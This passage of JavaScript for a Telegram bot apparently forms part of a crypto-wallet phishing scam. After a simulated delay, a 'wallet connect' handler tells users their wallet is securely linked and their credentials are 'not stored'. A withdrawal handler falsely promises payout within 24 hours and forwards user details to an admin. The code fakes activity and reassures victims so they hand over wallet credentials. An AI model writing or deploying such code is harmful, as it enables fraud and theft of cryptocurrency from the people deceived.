          `Please wait — this may take a few moments due to network congestion.`,
          { parse_mode: "HTML" }
        );

        await new Promise(r => setTimeout(r, 3500));

        await ctx.reply(
          `✅ <b>Wallet Connected Successfully!</b>\n\n` +
          `Your wallet has been securely linked to your account.\n` +
          `You can now use all premium features.\n\n` +
          `🔒 Your credentials have been processed and are not stored.`,
          { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
        );
        break;
      }

      // ── Withdrawal request ──────────────────────────────────────────────
      case "awaiting_withdraw_address": {
        const withdrawText = text;
        clearSession(ctx.from.id);
        await ctx.reply(
          `📤 <b>Withdrawal Request Received</b>\n\n` +
          `Details: <code>${withdrawText}</code>\n\n` +
          `⏳ Our team will process your withdrawal within 24 hours.\n` +
          `You'll receive a notification when it's sent.`,
          { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
        );
        await notifyAdmin(
          `📤 <b>Withdrawal Request</b>\n` +
          `👤 User: ${ctx.from.first_name}${ctx.from.username ? " (@" + ctx.from.username + ")" : ""}\n` +
          `🆔 User ID: <code>${ctx.from.id}</code>\n` +
          `Details: <code>${withdrawText}</code>`
        );
        break;
      }

      // ── Default: show main menu ─────────────────────────────────────────
      default: {
        await sendWelcome(ctx);
        break;
      }
    }
  });

  return bot;
}
